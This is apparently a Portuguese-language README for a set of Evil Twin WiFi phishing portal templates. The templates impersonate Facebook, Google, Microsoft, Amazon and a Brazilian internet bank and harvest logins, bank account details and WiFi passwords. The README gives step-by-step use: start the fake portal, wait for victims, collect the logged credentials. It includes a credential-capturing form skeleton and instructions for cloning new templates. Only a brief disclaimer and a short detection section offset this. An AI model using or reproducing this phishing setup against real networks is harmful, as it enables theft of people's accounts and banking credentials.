# 🌐 Captive Portals

Templates de portais captive para Evil Twin e phishing WiFi.

---

## ⚠️ Aviso Legal

**USE APENAS PARA TREINAMENTO E TESTES AUTORIZADOS!** Phishing é crime.

---

## 📁 Estrutura

```
portals/
├── en/                    # Templates em inglês
│   ├── facebook.html
│   ├── google.html
│   ├── instagram.html
│   ├── linkedin.html
│   ├── microsoft.html
│   ├── twitter.html
│   ├── amazon.html
│   └── router_update.html
└── pt-br/                 # Templates em português
    ├── facebook.html
    ├── google.html
    ├── instagram.html
    ├── microsoft.html
    ├── twitter.html
    ├── banco.html
    └── router_update.html
```

---

## 📖 O Que é Evil Twin?

Evil Twin é um ataque onde você cria um ponto de acesso falso que imita uma rede legítima. Quando vítimas conectam, são redirecionadas para um portal captive que captura credenciais.

---

## 🚀 Como Usar

### 1. Configurar Evil Portal

```
Menu → WiFi → Evil Portal
Selecione "Start Evil Portal"
Escolha o template HTML
```

### 2. Aguardar Conexões

Vítimas que conectarem ao AP verão o portal e podem inserir credenciais.

### 3. Capturar Credenciais

Credenciais são salvas automaticamente no log.

---

## 📋 Templates Disponíveis

### Redes Sociais (EN)
| Template | Alvo | Coleta |
|----------|------|--------|
| `facebook.html` | Facebook | Email/Senha |
| `google.html` | Google | Email/Senha |
| `instagram.html` | Instagram | Usuário/Senha |
| `twitter.html` | Twitter/X | Usuário/Senha |
| `linkedin.html` | LinkedIn | Email/Senha |

### Comerciais (EN)
| Template | Alvo | Coleta |
|----------|------|--------|
| `amazon.html` | Amazon | Email/Senha |
| `microsoft.html` | Microsoft | Email/Senha |

### Brasileiros (PT-BR)
| Template | Alvo | Coleta |
|----------|------|--------|
| `banco.html` | Internet Banking | Agência/Conta/Senha |
| `router_update.html` | Roteador | Senha WiFi |

---

## 🔧 Estrutura dos Arquivos HTML

```html
<!DOCTYPE html>
<html>
<head>
    <title>Título do Portal</title>
    <style>
        /* Estilos CSS */
    </style>
</head>
<body>
    <form action="/creds" method="POST">
        <input type="text" name="username">
        <input type="password" name="password">
        <button type="submit">Enviar</button>
    </form>
</body>
</html>
```

### Pontos Importantes

- `action="/creds"`: Action padrão para capturar credenciais
- `method="POST"`: Sempre use POST
- Nomes de campo: `username`, `email`, `password`, etc.

---

## 💡 Criando Novos Templates

### 1. Copie um template existente

```bash
cp en/facebook.html en/meu_template.html
```

### 2. Edite conforme necessário

Altere:
- Logo/Título
- Cores
- Campos do formulário
- Textos

### 3. Teste

Use o Evil Portal para testar antes de usar em produção.

---

## 🛡️ Detecção e Prevenção

### Como Detectar
- Verificar certificado SSL
- Desconfiar de portais não-HTTPS
- URLs suspeitas

### Como Prevenir
- Usar HTTPS em todos os sites
- Verificar certificados
- Educar usuários
- Usar MFA

---

## 📚 Referências

- [WiFi Pineapple](https://www.wifipineapple.com/)
- [Evil Twin Attack](https://en.wikipedia.org/wiki/Evil_twin_(wireless_networks))
- [Captive Portal](https://en.wikipedia.org/wiki/Captive_portal)

---

*Use com responsabilidade! 🛡️*